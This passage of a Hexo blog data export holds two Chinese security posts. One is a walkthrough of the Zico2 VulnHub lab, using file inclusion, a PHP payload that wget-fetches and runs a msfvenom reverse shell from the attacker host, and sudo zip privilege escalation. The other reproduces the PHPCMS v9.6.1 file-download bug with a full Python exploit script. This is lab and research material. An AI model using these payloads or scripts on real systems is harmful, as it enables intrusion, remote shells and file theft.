0x04 总结\n\n- 文件包含Getshell，还可以尝试包含其他文件，如SSH登录日志文件等。\n- Python2搭建简单HTTP服务器来传文件：`python -m SimpleHTTPServer 80`\n- 上传/执行文件遇权限问题时，可传到`/tmp`目录。\n\n**参考连接**\n\nhttps://www.colabug.com/1925534.html","slug":"hack-zico","published":1,"updated":"2019-02-27T06:47:55.868Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjszpjg8e0007j8r0za84bv1p","content":"<h2 id=\"0x00-环境\"><a href=\"#0x00-环境\" class=\"headerlink\" title=\"0x00 环境\"></a>0x00 环境</h2><ul>\n<li>靶机：<a href=\"https://www.vulnhub.com/series/zico2,137/#modal210download\" target=\"_blank\" rel=\"noopener\">Zico2</a></li>\n<li>攻击机：Kali Linux</li>\n<li>VirtualBox<ul>\n<li>网络连接方式：host-only、DHCP</li>\n</ul>\n</li>\n<li>目标：boot2root获取flag。</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"0x01-信息收集与漏洞挖掘\"><a href=\"#0x01-信息收集与漏洞挖掘\" class=\"headerlink\" title=\"0x01 信息收集与漏洞挖掘\"></a>0x01 信息收集与漏洞挖掘</h2><p><strong>1.主机发现：</strong><code>nmap -sn 192.168.110.0/24</code></p>\n<p>靶机自动获取IP，使用nmap进行主机发现，最终确定：靶机IP为192.168.110.3、攻击机IP：192.168.110.4、宿主机：192.168.110.5。</p>\n<p><img src=\"/2019/02/26/hack-zico/discovery.png\" alt></p>\n<p><strong>2.端口探测：</strong><code>nmap -Pn -sV -n -T4 -p- 192.168.110.3</code></p>\n<p>端口探测结果如下图，关注端口号22的SSH服务以及端口号80的Web服务。</p>\n<p>还确定了靶机系统为Ubuntu Linux、Web容器为Apache。</p>\n<p><img src=\"/2019/02/26/hack-zico/port.png\" alt></p>\n<p><strong>3.Web服务</strong></p>\n<ul>\n<li>服务探测：<code>whatweb http://192.168.110.3 -a 3</code></li>\n</ul>\n<p><img src=\"/2019/02/26/hack-zico/whatweb.png\" alt></p>\n<ul>\n<li>目录爆破：<code>dirb http://192.168.110.3</code></li>\n</ul>\n<p>爆破发现dbadmin，访问发现存在目录遍历漏洞，且目录下存在test_db.php文件。</p>\n<p><img src=\"/2019/02/26/hack-zico/dirb.png\" alt></p>\n<p><img src=\"/2019/02/26/hack-zico/dbadmin.png\" alt></p>\n<p>访问test_db.php发现是sqlite数据库连接管理页面phpLiteAdmin（类似phpmyadmin），尝试弱口令admin，成功进入。</p>\n<p>进入数据库管理页面后可获得以下信息：</p>\n<blockquote>\n<p>数据库路径：<code>/usr/databases/</code></p>\n<p>数据库名：<code>test_users</code></p>\n<p>数据表：<code>info</code></p>\n</blockquote>\n<p><img src=\"/2019/02/26/hack-zico/1.png\" alt></p>\n<p>查看数据表info，发现里面存在两条记录，判断是用户的用户名和密码。将密码拿到<a href=\"https://www.somd5.com/\" target=\"_blank\" rel=\"noopener\">somd5</a>网站解密，得到结果：</p>\n<blockquote>\n<p>root  34kroot34</p>\n<p>zico  zico2215@</p>\n</blockquote>\n<p>将得到的两个用户名密码尝试进行SSH登录，结果失败。</p>\n<ul>\n<li>漏洞扫描</li>\n</ul>\n<p>使用宿主机的AWVS进行漏洞扫描，发现存在文件包含、目录穿越漏洞。存在漏洞的连接为：<code>http://192.168.110.3/view.php?page=tools.html</code></p>\n<p><img src=\"/2019/02/26/hack-zico/2.png\" alt></p>\n<p>验证漏洞，尝试包含/etc/passwd文件，发现成功包含。</p>\n<p><img src=\"/2019/02/26/hack-zico/3.png\" alt></p>\n<h2 id=\"0x02-Getshell\"><a href=\"#0x02-Getshell\" class=\"headerlink\" title=\"0x02 Getshell\"></a>0x02 Getshell</h2><p>sqlite属于单文件数据库，类似Access数据库。</p>\n<p><strong>1.思路一</strong></p>\n<p>尝试通过数据库管理页面创建数据库的功能点创建一个shell文件，创建<code>../../var/www/html/shell.php</code>，<code>/</code>会被过滤，该方法不可行。</p>\n<p><strong>2.思路二：文件包含Getshell</strong></p>\n<p>先尝试通过日志文件<code>/var/log/apache2/access.log</code>，先访问<code>http://192.168.110.3/&lt;?php phpinfo();?&gt;</code>，然后尝试包含日志文件，发现没用。猜测是因为没有读取权限。</p>\n<p>包含数据库文件Getshell</p>\n<p>首先通过phpLiteAdmin向info表插入一条数据：<code>&lt;?php system(&quot;cd /tmp;wget http://192.168.110.4/shell;chmod +x shell;./shell&quot;);?&gt;</code>，该记录作用是进入/tmp目录，然后通过wget从攻击机上下载shell文件，再对shell文件添加执行权限然后运行。</p>\n<p><img src=\"/2019/02/26/hack-zico/4.png\" alt></p>\n<p>然后在攻击机上使用msfvenon生成shell文件：<code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.110.4 lport=4444 -f elf &gt; shell</code></p>\n<p>在shell文件所在的路径建立一个简单HTTP服务器：<code>python -m SimpleHTTPServer 80</code></p>\n<p>设置msf监听，<code>use exploit/multi/hander</code>、<code>set payload linux/x86/meterpreter/reverse_tcp</code>、<code>set lhost 192.168.110.4</code>。</p>\n<p>访问连接<code>http://192.168.110.3/view.php?page=../../usr/databases/test_users</code>，然后会得到一个meterpreter会话。</p>\n<p><img src=\"/2019/02/26/hack-zico/5.png\" alt></p>\n<h2 id=\"0x03-权限提升\"><a href=\"#0x03-权限提升\" class=\"headerlink\" title=\"0x03 权限提升\"></a>0x03 权限提升</h2><p>获得靶机shell后查看用户，发现不是root，需要提权。</p>\n<p><img src=\"/2019/02/26/hack-zico/7.png\" alt></p>\n<p>首先查看<code>/etc/passwd</code>文件，找出id大于1000的用户，发现值得关注的用户有root、zico。</p>\n<p><img src=\"/2019/02/26/hack-zico/8.png\" alt></p>\n<p>查找属主为zico的文件：<code>find / -user zico 2&gt; /dev/null</code>，执行后结果过多。直接<code>cd /home/zico</code>到zico的家目录。发现其中有个wordpress目录，猜测应该是博客系统代码。进入该目录发现wordpress的配置文件wp-config.php，查看文件内容，找到数据库密码：<code>sWfCsfJSPV9H3AmQzw8</code>。</p>\n<p><img src=\"/2019/02/26/hack-zico/9.png\" alt></p>\n<p>尝试使用该用户名密码登录SSH：<code>ssh zico@sWfCsfJSPV9H3AmQzw8</code>。成功登录。</p>\n<p>使用<code>sudo -l</code>命令查看zico用户可以执行的root命令。发现可以执行<code>/bin/tar</code>、<code>/usr/bin/zip</code>。</p>\n<p><img src=\"/2019/02/26/hack-zico/10.png\" alt></p>\n<p>执行<code>touch /tmp/exploit</code>、<code>sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=&quot;bash -c /bin/sh&quot;</code></p>\n<p>成功提权至root。</p>\n<p><img src=\"/2019/02/26/hack-zico/11.png\" alt></p>\n<p>获取flag，进入root用户家目录，flag在目录下的flag.txt文件。</p>\n<p><img src=\"/2019/02/26/hack-zico/12.png\" alt></p>\n<p><strong>另一种提权方式</strong></p>\n<p>获得反弹shell后，查看系统内核版本，发现内核版本为3.2.0-23。</p>\n<p><img src=\"/2019/02/26/hack-zico/13.png\" alt></p>\n<p>到<a href=\"https://www.exploit-db.com/search\" target=\"_blank\" rel=\"noopener\">Exploit-DB</a>搜索内核提权漏洞，并下载Exp到靶机编译执行。</p>\n<p><img src=\"/2019/02/26/hack-zico/14.png\" alt></p>\n<h2 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a>0x04 总结</h2><ul>\n<li>文件包含Getshell，还可以尝试包含其他文件，如SSH登录日志文件等。</li>\n<li>Python2搭建简单HTTP服务器来传文件：<code>python -m SimpleHTTPServer 80</code></li>\n<li>上传/执行文件遇权限问题时，可传到<code>/tmp</code>目录。</li>\n</ul>\n<p><strong>参考连接</strong></p>\n<p><a href=\"https://www.colabug.com/1925534.html\" target=\"_blank\" rel=\"noopener\">https://www.colabug.com/1925534.html</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-环境\"><a href=\"#0x00-环境\" class=\"headerlink\" title=\"0x00 环境\"></a>0x00 环境</h2><ul>\n<li>靶机：<a href=\"https://www.vulnhub.com/series/zico2,137/#modal210download\" target=\"_blank\" rel=\"noopener\">Zico2</a></li>\n<li>攻击机：Kali Linux</li>\n<li>VirtualBox<ul>\n<li>网络连接方式：host-only、DHCP</li>\n</ul>\n</li>\n<li>目标：boot2root获取flag。</li>\n</ul>","more":"<h2 id=\"0x01-信息收集与漏洞挖掘\"><a href=\"#0x01-信息收集与漏洞挖掘\" class=\"headerlink\" title=\"0x01 信息收集与漏洞挖掘\"></a>0x01 信息收集与漏洞挖掘</h2><p><strong>1.主机发现：</strong><code>nmap -sn 192.168.110.0/24</code></p>\n<p>靶机自动获取IP，使用nmap进行主机发现，最终确定：靶机IP为192.168.110.3、攻击机IP：192.168.110.4、宿主机：192.168.110.5。</p>\n<p><img src=\"/2019/02/26/hack-zico/discovery.png\" alt></p>\n<p><strong>2.端口探测：</strong><code>nmap -Pn -sV -n -T4 -p- 192.168.110.3</code></p>\n<p>端口探测结果如下图，关注端口号22的SSH服务以及端口号80的Web服务。</p>\n<p>还确定了靶机系统为Ubuntu Linux、Web容器为Apache。</p>\n<p><img src=\"/2019/02/26/hack-zico/port.png\" alt></p>\n<p><strong>3.Web服务</strong></p>\n<ul>\n<li>服务探测：<code>whatweb http://192.168.110.3 -a 3</code></li>\n</ul>\n<p><img src=\"/2019/02/26/hack-zico/whatweb.png\" alt></p>\n<ul>\n<li>目录爆破：<code>dirb http://192.168.110.3</code></li>\n</ul>\n<p>爆破发现dbadmin，访问发现存在目录遍历漏洞，且目录下存在test_db.php文件。</p>\n<p><img src=\"/2019/02/26/hack-zico/dirb.png\" alt></p>\n<p><img src=\"/2019/02/26/hack-zico/dbadmin.png\" alt></p>\n<p>访问test_db.php发现是sqlite数据库连接管理页面phpLiteAdmin（类似phpmyadmin），尝试弱口令admin，成功进入。</p>\n<p>进入数据库管理页面后可获得以下信息：</p>\n<blockquote>\n<p>数据库路径：<code>/usr/databases/</code></p>\n<p>数据库名：<code>test_users</code></p>\n<p>数据表：<code>info</code></p>\n</blockquote>\n<p><img src=\"/2019/02/26/hack-zico/1.png\" alt></p>\n<p>查看数据表info，发现里面存在两条记录，判断是用户的用户名和密码。将密码拿到<a href=\"https://www.somd5.com/\" target=\"_blank\" rel=\"noopener\">somd5</a>网站解密，得到结果：</p>\n<blockquote>\n<p>root  34kroot34</p>\n<p>zico  zico2215@</p>\n</blockquote>\n<p>将得到的两个用户名密码尝试进行SSH登录，结果失败。</p>\n<ul>\n<li>漏洞扫描</li>\n</ul>\n<p>使用宿主机的AWVS进行漏洞扫描，发现存在文件包含、目录穿越漏洞。存在漏洞的连接为：<code>http://192.168.110.3/view.php?page=tools.html</code></p>\n<p><img src=\"/2019/02/26/hack-zico/2.png\" alt></p>\n<p>验证漏洞，尝试包含/etc/passwd文件，发现成功包含。</p>\n<p><img src=\"/2019/02/26/hack-zico/3.png\" alt></p>\n<h2 id=\"0x02-Getshell\"><a href=\"#0x02-Getshell\" class=\"headerlink\" title=\"0x02 Getshell\"></a>0x02 Getshell</h2><p>sqlite属于单文件数据库，类似Access数据库。</p>\n<p><strong>1.思路一</strong></p>\n<p>尝试通过数据库管理页面创建数据库的功能点创建一个shell文件，创建<code>../../var/www/html/shell.php</code>，<code>/</code>会被过滤，该方法不可行。</p>\n<p><strong>2.思路二：文件包含Getshell</strong></p>\n<p>先尝试通过日志文件<code>/var/log/apache2/access.log</code>，先访问<code>http://192.168.110.3/&lt;?php phpinfo();?&gt;</code>，然后尝试包含日志文件，发现没用。猜测是因为没有读取权限。</p>\n<p>包含数据库文件Getshell</p>\n<p>首先通过phpLiteAdmin向info表插入一条数据：<code>&lt;?php system(&quot;cd /tmp;wget http://192.168.110.4/shell;chmod +x shell;./shell&quot;);?&gt;</code>，该记录作用是进入/tmp目录，然后通过wget从攻击机上下载shell文件，再对shell文件添加执行权限然后运行。</p>\n<p><img src=\"/2019/02/26/hack-zico/4.png\" alt></p>\n<p>然后在攻击机上使用msfvenon生成shell文件：<code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.110.4 lport=4444 -f elf &gt; shell</code></p>\n<p>在shell文件所在的路径建立一个简单HTTP服务器：<code>python -m SimpleHTTPServer 80</code></p>\n<p>设置msf监听，<code>use exploit/multi/hander</code>、<code>set payload linux/x86/meterpreter/reverse_tcp</code>、<code>set lhost 192.168.110.4</code>。</p>\n<p>访问连接<code>http://192.168.110.3/view.php?page=../../usr/databases/test_users</code>，然后会得到一个meterpreter会话。</p>\n<p><img src=\"/2019/02/26/hack-zico/5.png\" alt></p>\n<h2 id=\"0x03-权限提升\"><a href=\"#0x03-权限提升\" class=\"headerlink\" title=\"0x03 权限提升\"></a>0x03 权限提升</h2><p>获得靶机shell后查看用户，发现不是root，需要提权。</p>\n<p><img src=\"/2019/02/26/hack-zico/7.png\" alt></p>\n<p>首先查看<code>/etc/passwd</code>文件，找出id大于1000的用户，发现值得关注的用户有root、zico。</p>\n<p><img src=\"/2019/02/26/hack-zico/8.png\" alt></p>\n<p>查找属主为zico的文件：<code>find / -user zico 2&gt; /dev/null</code>，执行后结果过多。直接<code>cd /home/zico</code>到zico的家目录。发现其中有个wordpress目录，猜测应该是博客系统代码。进入该目录发现wordpress的配置文件wp-config.php，查看文件内容，找到数据库密码：<code>sWfCsfJSPV9H3AmQzw8</code>。</p>\n<p><img src=\"/2019/02/26/hack-zico/9.png\" alt></p>\n<p>尝试使用该用户名密码登录SSH：<code>ssh zico@sWfCsfJSPV9H3AmQzw8</code>。成功登录。</p>\n<p>使用<code>sudo -l</code>命令查看zico用户可以执行的root命令。发现可以执行<code>/bin/tar</code>、<code>/usr/bin/zip</code>。</p>\n<p><img src=\"/2019/02/26/hack-zico/10.png\" alt></p>\n<p>执行<code>touch /tmp/exploit</code>、<code>sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=&quot;bash -c /bin/sh&quot;</code></p>\n<p>成功提权至root。</p>\n<p><img src=\"/2019/02/26/hack-zico/11.png\" alt></p>\n<p>获取flag，进入root用户家目录，flag在目录下的flag.txt文件。</p>\n<p><img src=\"/2019/02/26/hack-zico/12.png\" alt></p>\n<p><strong>另一种提权方式</strong></p>\n<p>获得反弹shell后，查看系统内核版本，发现内核版本为3.2.0-23。</p>\n<p><img src=\"/2019/02/26/hack-zico/13.png\" alt></p>\n<p>到<a href=\"https://www.exploit-db.com/search\" target=\"_blank\" rel=\"noopener\">Exploit-DB</a>搜索内核提权漏洞，并下载Exp到靶机编译执行。</p>\n<p><img src=\"/2019/02/26/hack-zico/14.png\" alt></p>\n<h2 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a>0x04 总结</h2><ul>\n<li>文件包含Getshell，还可以尝试包含其他文件，如SSH登录日志文件等。</li>\n<li>Python2搭建简单HTTP服务器来传文件：<code>python -m SimpleHTTPServer 80</code></li>\n<li>上传/执行文件遇权限问题时，可传到<code>/tmp</code>目录。</li>\n</ul>\n<p><strong>参考连接</strong></p>\n<p><a href=\"https://www.colabug.com/1925534.html\" target=\"_blank\" rel=\"noopener\">https://www.colabug.com/1925534.html</a></p>"},{"title":"PHPCMSv9.6.1任意文件下载漏洞复现","date":"2019-02-25T12:32:30.000Z","_content":"\n## 0x00 环境介绍\n\n- 系统：Windows 10\n- Phpstudy 2018\n- CMS：PHPCMS v9.6.1\n  - PHPCMS v9各版本下载地址：`http://download.phpcms.cn/v9/9.6/`\n\n<!-- more -->\n\n## 0x01 安装PHPCMS v9\n\n首先下载PHPCMS v9.6.1并解压，将解压得到的install_package目录拷贝到网站根目录下。\n\n启动phpstudy，访问`http://localhost/install_package/install/install.php`进入安装界面。\n\n依次点击下一步进行安装即可，数据库密码phpstudy默认是root/root。\n\n## 0x02 漏洞利用\n\n**1.获取Cookie：xxx_siteid**\n\n首先访问`http://localhost/install_package/index.php?m=wap&c=index&a=init&siteid=1`并获取Cookie。\n\n![](phpcms9-6-1\\siteid.png)\n\n**2.获取Cookie：xxx_att_json**\n\n访问`http://localhost/install_package/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C`，并将上一步获取的siteid的Cookie值作为POST字段userid_flash的值一同提交，然后从响应消息中找到xxx_att_json的Cookie值。\n\n![](phpcms9-6-1\\att_json.png)\n\n要点：\n\n> - `src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C`是payload，是我们要下载的文件。此处我们使用的payload实现要下载的文件是`/phpcms/modules/content/down.php`。\n\n**3.获取下载链接**\n\n访问`http://localhost/install_package/index.php?m=content&c=down&a=init&a_k=`，并将上一步得到的xxx_att_json的值作为a_k参数的值。\n\n> `http://localhost/install_package/index.php?m=content&c=down&a=init&a_k=61e9vtz6uMRQ6iACSVg06WBUXXslD430-hA7DDHM_5cMyGqOkQDeAPBXQURI2hDzEa-inCgLSjD2Ru66mQASlP3Qd06DqBJfeSuqMlZHaTOYO_VdhkWCDz8TD8SEQ3qoqho4ILiuVMSp7f_j05YY57YruJ1uIdHMbqaTyfClLBPv95lNtaRHQszhD9GZ0QEh8g`\n\n访问过后，会返回一个带有下载按钮的页面，点击下载按钮即可下载。\n\n![](phpcms9-6-1\\download.png)\n\n## 0x03 遇到的问题\n\n得到下载连接访问页面，点击下载会报参数错误。\n\n解决办法：\n\n> - `https://blog.csdn.net/vindraz/article/details/12579211`\n> - `http://www.cmsyou.com/support/172.html`\n\n## 0x04 修复建议\n\n升级PHPCMS版本到9.6.2或以上。\n\n## 0x05 PoC\n\n- Github：`https://github.com/sh4douu/PoC-and-Exp/blob/master/phpcmsv961.py`\n- 代码：\n\n```\nimport requests\nimport re\nimport sys\n\nheaders = {\"User-Agent\":\"Mozilla/5.0 (Windows NT 6.1; WOW64)\"}\n\ndef get_cookie1(host):\n    url_1 = host + \"/index.php?m=wap&c=index&a=init&siteid=1\"\n    print(\"[*] 请稍等...正在获取Cookie:\")\n    reponse = requests.get(url_1,headers=headers)\n\n    \n    try:\n        pattern = r\".*siteid\"  #phpcmsv9 siteid字段格式为：xxxx_siteid,使用该正则匹配\n        for item in reponse.cookies.keys():\n            res = re.findall(pattern,item)\n\n            if res:\n                cookie1 = reponse.cookies.get(res[0])\n                print(\"[+] 获取到Cookie1:\")\n                print(\"[+] \" + res[0] + \":\" + cookie1)\n                return cookie1\n\n    except:\n        print(\"[-] 获取Cookie1失败!\")\n\ndef get_cookie2(host,cookie1):\n    #该payload实现下载phpcms/modules/content/down.php文件 \n    payload = \"src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dphpcms%2fmodules%2fcontent%2fdown.ph%26f=p%3%252%2*77C\"\n    \n    #payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26f%3D%2Ep%25253chp%26s%3Dindex%26pade%3D\"\n    #payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D%2Ep%25253chp%26pade%3D\"\n\n    url_2 = host + \"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&\" + payload\n        \n    data = {\"userid_flash\":cookie1}  #将第一次得到的cookie作为\"userid_flash\"的值，并以POST方式提交\n    reponse = requests.post(url_2,data=data,headers=headers)\n\n    try:\n        pattern = r\".*att_json\" #phpcmsv9 att_json字段格式为：xxxx_att_json,使用该正则匹配\n        for item in reponse.cookies.keys():\n            res = re.findall(pattern,item)\n            if res:\n                cookie2 = reponse.cookies.get(res[0])\n                print(\"[+] 获取到Cookie2:\")\n                print(\"[+] \" + res[0] + \":\" + cookie2)\n                return cookie2\n\n    except:\n        print(\"[-] 获取Cookie2失败!\")\n\ndef help():\n    print(\"-------------------------------------------------------------------------\")\n    print(\" [*] 使用说明：给出index.php之前的部分\")\n    print(\"       Usage: python3 phpcmsv9.py http://host:port\")\n    print(\"     Example：python3 phpcmsv9.py http://localhost/phpcms\")\n    print(\"-------------------------------------------------------------------------\")\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        help()\n        sys.exit(0)\n\n    host = sys.argv[1].strip()\n    cookie1 = get_cookie1(host)\n    cookie2 = get_cookie2(host,cookie1)\n\n    if cookie2:\n        print(\"[+] Open link to download file: \")\n        print(\"[+] \" + host + \"/index.php?m=content&c=down&a=init&a_k=\" + cookie2) #最终文件下载连接\n```\n\n","source":"_posts/phpcms9-6-1.md","raw":"---\ntitle: PHPCMSv9.6.1任意文件下载漏洞复现\ndate: 2019-02-25 20:32:30\ntags:\n\t- PHPCMSv9  \n\t- 任意文件下载 \n\t- PHP\ncategories: 漏洞复现\n---\n\n## 0x00 环境介绍\n\n- 系统：Windows 10\n- Phpstudy 2018\n- CMS：PHPCMS v9.6.1\n  - PHPCMS v9各版本下载地址：`http://download.phpcms.cn/v9/9.6/`\n\n<!-- more -->\n\n## 0x01 安装PHPCMS v9\n\n首先下载PHPCMS v9.6.1并解压，将解压得到的install_package目录拷贝到网站根目录下。\n\n启动phpstudy，访问`http://localhost/install_package/install/install.php`进入安装界面。\n\n依次点击下一步进行安装即可，数据库密码phpstudy默认是root/root。\n\n## 0x02 漏洞利用\n\n**1.获取Cookie：xxx_siteid**\n\n首先访问`http://localhost/install_package/index.php?m=wap&c=index&a=init&siteid=1`并获取Cookie。\n\n![](phpcms9-6-1\\siteid.png)\n\n**2.获取Cookie：xxx_att_json**\n\n访问`http://localhost/install_package/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C`，并将上一步获取的siteid的Cookie值作为POST字段userid_flash的值一同提交，然后从响应消息中找到xxx_att_json的Cookie值。\n\n![](phpcms9-6-1\\att_json.png)\n\n要点：\n\n> - `src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C`是payload，是我们要下载的文件。此处我们使用的payload实现要下载的文件是`/phpcms/modules/content/down.php`。\n\n**3.获取下载链接**\n\n访问`http://localhost/install_package/index.php?m=content&c=down&a=init&a_k=`，并将上一步得到的xxx_att_json的值作为a_k参数的值。\n\n> `http://localhost/install_package/index.php?m=content&c=down&a=init&a_k=61e9vtz6uMRQ6iACSVg06WBUXXslD430-hA7DDHM_5cMyGqOkQDeAPBXQURI2hDzEa-inCgLSjD2Ru66mQASlP3Qd06DqBJfeSuqMlZHaTOYO_VdhkWCDz8TD8SEQ3qoqho4ILiuVMSp7f_j05YY57YruJ1uIdHMbqaTyfClLBPv95lNtaRHQszhD9GZ0QEh8g`\n\n访问过后，会返回一个带有下载按钮的页面，点击下载按钮即可下载。\n\n![](phpcms9-6-1\\download.png)\n\n## 0x03 遇到的问题\n\n得到下载连接访问页面，点击下载会报参数错误。\n\n解决办法：\n\n> - `https://blog.csdn.net/vindraz/article/details/12579211`\n> - `http://www.cmsyou.com/support/172.html`\n\n## 0x04 修复建议\n\n升级PHPCMS版本到9.6.2或以上。\n\n## 0x05 PoC\n\n- Github：`https://github.com/sh4douu/PoC-and-Exp/blob/master/phpcmsv961.py`\n- 代码：\n\n```\nimport requests\nimport re\nimport sys\n\nheaders = {\"User-Agent\":\"Mozilla/5.0 (Windows NT 6.1; WOW64)\"}\n\ndef get_cookie1(host):\n    url_1 = host + \"/index.php?m=wap&c=index&a=init&siteid=1\"\n    print(\"[*] 请稍等...正在获取Cookie:\")\n    reponse = requests.get(url_1,headers=headers)\n\n    \n    try:\n        pattern = r\".*siteid\"  #phpcmsv9 siteid字段格式为：xxxx_siteid,使用该正则匹配\n        for item in reponse.cookies.keys():\n            res = re.findall(pattern,item)\n\n            if res:\n                cookie1 = reponse.cookies.get(res[0])\n                print(\"[+] 获取到Cookie1:\")\n                print(\"[+] \" + res[0] + \":\" + cookie1)\n                return cookie1\n\n    except:\n        print(\"[-] 获取Cookie1失败!\")\n\ndef get_cookie2(host,cookie1):\n    #该payload实现下载phpcms/modules/content/down.php文件 \n    payload = \"src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dphpcms%2fmodules%2fcontent%2fdown.ph%26f=p%3%252%2*77C\"\n    \n    #payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26f%3D%2Ep%25253chp%26s%3Dindex%26pade%3D\"\n    #payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D%2Ep%25253chp%26pade%3D\"\n\n    url_2 = host + \"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&\" + payload\n        \n    data = {\"userid_flash\":cookie1}  #将第一次得到的cookie作为\"userid_flash\"的值，并以POST方式提交\n    reponse = requests.post(url_2,data=data,headers=headers)\n\n    try:\n        pattern = r\".*att_json\" #phpcmsv9 att_json字段格式为：xxxx_att_json,使用该正则匹配\n        for item in reponse.cookies.keys():\n            res = re.findall(pattern,item)\n            if res:\n                cookie2 = reponse.cookies.get(res[0])\n                print(\"[+] 获取到Cookie2:\")\n                print(\"[+] \" + res[0] + \":\" + cookie2)\n                return cookie2\n\n    except:\n        print(\"[-] 获取Cookie2失败!\")\n\ndef help():\n    print(\"-------------------------------------------------------------------------\")\n    print(\" [*] 使用说明：给出index.php之前的部分\")\n    print(\"       Usage: python3 phpcmsv9.py http://host:port\")\n    print(\"     Example：python3 phpcmsv9.py http://localhost/phpcms\")\n    print(\"-------------------------------------------------------------------------\")\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        help()\n        sys.exit(0)\n\n    host = sys.argv[1].strip()\n    cookie1 = get_cookie1(host)\n    cookie2 = get_cookie2(host,cookie1)\n\n    if cookie2:\n        print(\"[+] Open link to download file: \")\n        print(\"[+] \" + host + \"/index.php?m=content&c=down&a=init&a_k=\" + cookie2) #最终文件下载连接\n```\n\n","slug":"phpcms9-6-1","published":1,"updated":"2019-02-26T01:56:47.470Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjszpjg8f0008j8r00igk8wx6","content":"<h2 id=\"0x00-环境介绍\"><a href=\"#0x00-环境介绍\" class=\"headerlink\" title=\"0x00 环境介绍\"></a>0x00 环境介绍</h2><ul>\n<li>系统：Windows 10</li>\n<li>Phpstudy 2018</li>\n<li>CMS：PHPCMS v9.6.1<ul>\n<li>PHPCMS v9各版本下载地址：<code>http://download.phpcms.cn/v9/9.6/</code></li>\n</ul>\n</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"0x01-安装PHPCMS-v9\"><a href=\"#0x01-安装PHPCMS-v9\" class=\"headerlink\" title=\"0x01 安装PHPCMS v9\"></a>0x01 安装PHPCMS v9</h2><p>首先下载PHPCMS v9.6.1并解压，将解压得到的install_package目录拷贝到网站根目录下。</p>\n<p>启动phpstudy，访问<code>http://localhost/install_package/install/install.php</code>进入安装界面。</p>\n<p>依次点击下一步进行安装即可，数据库密码phpstudy默认是root/root。</p>\n<h2 id=\"0x02-漏洞利用\"><a href=\"#0x02-漏洞利用\" class=\"headerlink\" title=\"0x02 漏洞利用\"></a>0x02 漏洞利用</h2><p><strong>1.获取Cookie：xxx_siteid</strong></p>\n<p>首先访问<code>http://localhost/install_package/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1</code>并获取Cookie。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/siteid.png\" alt></p>\n<p><strong>2.获取Cookie：xxx_att_json</strong></p>\n<p>访问<code>http://localhost/install_package/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C</code>，并将上一步获取的siteid的Cookie值作为POST字段userid_flash的值一同提交，然后从响应消息中找到xxx_att_json的Cookie值。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/att_json.png\" alt></p>\n<p>要点：</p>\n<blockquote>\n<ul>\n<li><code>src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C</code>是payload，是我们要下载的文件。此处我们使用的payload实现要下载的文件是<code>/phpcms/modules/content/down.php</code>。</li>\n</ul>\n</blockquote>\n<p><strong>3.获取下载链接</strong></p>\n<p>访问<code>http://localhost/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=</code>，并将上一步得到的xxx_att_json的值作为a_k参数的值。</p>\n<blockquote>\n<p><code>http://localhost/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=61e9vtz6uMRQ6iACSVg06WBUXXslD430-hA7DDHM_5cMyGqOkQDeAPBXQURI2hDzEa-inCgLSjD2Ru66mQASlP3Qd06DqBJfeSuqMlZHaTOYO_VdhkWCDz8TD8SEQ3qoqho4ILiuVMSp7f_j05YY57YruJ1uIdHMbqaTyfClLBPv95lNtaRHQszhD9GZ0QEh8g</code></p>\n</blockquote>\n<p>访问过后，会返回一个带有下载按钮的页面，点击下载按钮即可下载。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/download.png\" alt></p>\n<h2 id=\"0x03-遇到的问题\"><a href=\"#0x03-遇到的问题\" class=\"headerlink\" title=\"0x03 遇到的问题\"></a>0x03 